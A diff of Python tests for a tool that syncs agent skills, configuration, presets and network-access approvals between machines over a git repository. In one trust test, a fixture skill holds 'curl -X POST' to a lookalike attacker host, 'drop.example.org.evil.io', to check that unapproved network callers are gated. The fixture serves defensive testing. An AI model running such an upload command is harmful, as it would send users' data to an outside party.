@@ -477,6 +477,7 @@ class ReviewRegressionTest(Base):
     def two_machines(self):
         bare = self.tmp / "bank.git"
         subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(bare)], check=True)
+        self.set_config(peer_name="one")
         self.sg("gate")
         self.sg("remote", str(bare))
         self.sg("push")
@@ -484,9 +485,90 @@ class ReviewRegressionTest(Base):
         (home2 / ".claude" / "skills").mkdir(parents=True)
         env2 = dict(self.env, HOME=str(home2), SKILLS_GATE_HOME=str(home2 / ".skills-gate"))
         self.sg("init", env=env2)
+        self.set_config2(home2, peer_name="two")
         self.sg("remote", str(bare), env=env2)
         self.sg("pull", env=env2)
         return home2, env2
+
+    def set_config2(self, home2, **kw):
+        p = home2 / ".skills-gate" / "config.json"
+        cfg = json.loads(p.read_text())
+        cfg.update(kw)
+        p.write_text(json.dumps(cfg))
+
+    def cfg2(self, home2):
+        return json.loads((home2 / ".skills-gate" / "config.json").read_text())
+
+    def test_shared_settings_follow_the_side_that_changed(self):
+        home2, env2 = self.two_machines()
+        # the first sync took machine 1's always-on set; paths stay per machine
+        self.assertIn("keep-me", self.cfg2(home2)["always_on"])
+        self.assertNotIn(str(self.home), json.dumps(self.cfg2(home2).get("usage_sources", {})))
+        self.set_config2(home2, cold_days=30, always_on=["keep-me", "code-review"])
+        self.sg("push", env=env2)
+        self.sg("pull")
+        cfg1 = json.loads((self.sgh / "config.json").read_text())
+        self.assertEqual(cfg1["cold_days"], 30)
+        self.assertEqual(cfg1["always_on"], ["keep-me", "code-review"])
+        # a change on machine 1 later is not undone by machine 2's older value
+        self.set_config(cold_days=60)
+        self.sg("push")
+        self.sg("pull", env=env2)
+        self.assertEqual(self.cfg2(home2)["cold_days"], 60)
+        # presets: a deletion travels too
+        self.sg("preset", "save", "kit", "code-review")
+        self.sg("push")
+        self.sg("pull", env=env2)
+        self.assertIn("code-review", self.sg("preset", "show", "kit", env=env2).stdout)
+        self.sg("preset", "rm", "kit", env=env2)
+        self.sg("push", env=env2)
+        self.sg("pull")
+        self.assertNotIn("kit", self.sg("preset", "list").stdout)
+        # lanes and pins
+        self.sg("set-lane", "ops", "video-cut", env=env2)
+        self.sg("pin", "video-cut", env=env2)
+        self.sg("push", env=env2)
+        self.sg("pull")
+        self.assertIn("ops", self.sg("show", "video-cut").stdout)
+        db = self.db()
+        self.assertEqual(db.execute("select pinned from skills where name='video-cut'").fetchone()[0], 1)
+        db.close()
+
+    def test_cold_storage_counts_every_peers_use(self):
+        home2, env2 = self.two_machines()
+        old = int(time.time()) - 400 * 86400
+        for d in (self.sgh / "gate.db", home2 / ".skills-gate" / "gate.db"):
+            db = sqlite3.connect(d)
+            db.execute("update skills set added_at=?, last_used=null, uses=0", (old,))
+            db.commit()
+            db.close()
+        self.sg("use", "video-cut", env=env2)  # used only on machine 2
+        self.sg("push", env=env2)
+        self.sg("pull")
+        out = self.sg("tidy").stdout
+        self.assertNotIn("[cold]  video-cut", out)
+        self.assertIn("[cold]  code-review", out)  # nobody used this one
+        self.assertIn("video-cut", self.sg("show", "video-cut").stdout)
+
+    def test_peers_and_join(self):
+        home2, env2 = self.two_machines()
+        self.sg("push", env=env2)
+        self.sg("pull")
+        out = self.sg("peers").stdout
+        self.assertIn("one *", out)
+        self.assertIn("two", out)
+        self.assertIn("in step", out)
+        self.assertIn("also on the bank: two", self.sg("status").stdout)
+        # a third machine joins in one command and ends up with the same bank and settings
+        home3 = self.tmp / "home3"
+        (home3 / ".claude" / "skills").mkdir(parents=True)
+        env3 = dict(self.env, HOME=str(home3), SKILLS_GATE_HOME=str(home3 / ".skills-gate"))
+        out = self.sg("join", str(self.tmp / "bank.git"), env=env3).stdout
+        self.assertIn("in step", out)
+        self.assertEqual(self.listing(home3 / ".skills-gate" / "bank"), self.listing(self.sgh / "bank"))
+        self.assertIn("keep-me", self.cfg2(home3)["always_on"])
+        # a quiet push makes no commit
+        self.assertIn("nothing changed", self.sg("push", env=env3).stdout)
 
     def test_broken_link_on_one_machine_never_removes_it_elsewhere(self):
         home2, env2 = self.two_machines()
@@ -713,7 +795,7 @@ class TrustTest(Base):
         md.write_text(md.read_text() + "changed\n")
         self.assertIn("video-cut", self.sg("tidy").stdout.split("[review]")[1])
 
-    def test_approvals_travel_with_sync_and_pulled_callers_are_held(self):
+    def test_approvals_and_revokes_travel_and_pulled_callers_match_the_peer(self):
         bare = self.tmp / "bank.git"
         subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(bare)], check=True)
         self.caller(self.tmp / "a")
@@ -727,7 +809,7 @@ class TrustTest(Base):
         self.sg("remote", str(bare), env=env2)
         self.assertIn("1 new", self.sg("pull", env=env2).stdout)  # approval came along, so it is admitted
         self.assertIn("api.weather.example.net", self.sg("net", "hosts", env=env2).stdout)
-        # an unapproved caller pushed from machine 1 is held on machine 2
+        # a caller banked unapproved on machine 1 is banked unapproved on machine 2: same bank, same gate at use
         self.caller(self.tmp / "b", "uploader", "curl -X POST https://drop.example.org.evil.io/up\n")
         self.sg("add", str(self.tmp / "b"), "--allow-net")
         db = self.db()
@@ -736,7 +818,26 @@ class TrustTest(Base):
         db.close()
         self.sg("push")
         out = self.sg("pull", env=env2).stdout
-        self.assertIn("1 held", out)
+        self.assertIn("1 new", out)
+        self.assertIn("0 held", out)
+        self.assertIn("NETWORK NOT APPROVED", self.sg("use", "uploader", env=env2).stdout)
+        # copies an older version held back are cleared once the skill is admitted; the same push is not re-held
+        q = home2 / ".skills-gate" / "quarantine" / "uploader-20261115-000000"
+        import shutil
+        shutil.copytree(home2 / ".skills-gate" / "bank" / "uploader", q)
+        db2 = sqlite3.connect(home2 / ".skills-gate" / "gate.db")
+        db2.execute("delete from skills where name='uploader'")
+        db2.execute("delete from sync_state where name='uploader'")
+        db2.commit()
+        db2.close()
+        shutil.rmtree(home2 / ".skills-gate" / "bank" / "uploader")
+        self.assertIn("1 new", self.sg("pull", env=env2).stdout)
+        self.assertFalse(q.exists())
+        # a revoke on one machine reaches the other (it used to come back on the next pull)
+        self.sg("net", "revoke", "weather", env=env2)
+        self.sg("push", env=env2)
+        self.sg("pull")
+        self.assertIn("NETWORK NOT APPROVED", self.sg("use", "weather").stdout)
 
     def test_injected_agent_guard_does_not_break_bank_sync(self):
         # The operator's agent guard arrives as an injected core.hooksPath that rejects main; the tool's own
